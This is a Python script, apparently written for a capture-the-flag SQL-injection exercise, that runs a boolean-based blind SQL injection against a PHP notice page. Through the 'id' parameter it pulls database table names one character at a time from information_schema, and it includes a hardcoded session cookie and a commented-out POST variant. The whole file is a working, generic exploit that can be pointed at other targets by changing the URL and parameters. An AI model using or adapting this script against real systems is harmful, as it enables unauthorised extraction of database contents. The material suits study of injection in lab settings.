import requests

url = "http://ctf2.segfaulthub.com:7777/sqli_8/notice_read.php"  # 타겟 주소
#charset = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}[]"
max_t = 10  # 최대 10개 테이블까지 시도
table_len = 30  # 테이블 이름 최대 길이
true_val = "177" # 기준이 될 클라이언트의 True 값
keyword = "글제목"    # 응답내용의 keyword 입력

tables = []  # 추출된 테이블 이름 저장용

for t in range(max_t):
    extracted_table = ""
    for i in range(1, table_len + 1):
        found = False
        for char_code in range(32,127):
            # 페이로드 작성
            payload = (
                f"{true_val} AND ASCII(BINARY SUBSTRING((SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema=DATABASE() "
                f"LIMIT {t},1), {i}, 1)) = {char_code}"
            )
            
            payload2 = (
                f"1=1 AND ASCII(BINARY SUBSTRING((SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema=DATABASE() "
                f"LIMIT {t},1), {i}, 1)) = {char_code} AND {true_val} "
            )

            cookies = {
                'PHPSESSID' : "i9ngp3tb9cmjo670dntkj3bpe6"
            }

            # GET 메서드 & 파라미터명 설정
            params={'id':payload, 'view': "1"}
            
            response = requests.get(url, params=params, cookies=cookies)

            # POST 메서드 & 바디데이터 설정
            data = {
                'option_val': payload2,
                'board_result' : "dk",
                'board_search': "%F0%9F%94%8D",
                'date_from': "",
                'date_to' : ""
            }
            #response = requests.post(url, data=data,cookies=cookies , allow_redirects=False)

            # 키워드 확인
            if keyword :
                if keyword in response.text:
                    extracted_table += chr(char_code)
                    print(f"[+] Table {t+1}, character {i}: {chr(char_code)}")
                    found = True
                    break
            # 응답 코드로 구분할 때
            elif response.status_code == 302:
                extracted_table += chr(char_code)
                print(f"[+] Table {t+1}, character {i}: {chr(char_code)}")
                found = True
                break
        if not found :
            break
    # 완성된 테이블명 리스트에 추가
    if extracted_table:
        tables.append(extracted_table)
        print(f"[✔] Table {t+1} name: {extracted_table}")
    else:
        print("[-] No more tables found.")
        break

# 결과 정리 출력
print("\n[✅] 추출된 테이블 목록:")
for idx, name in enumerate(tables, 1):
    print(f"{idx}. {name}")
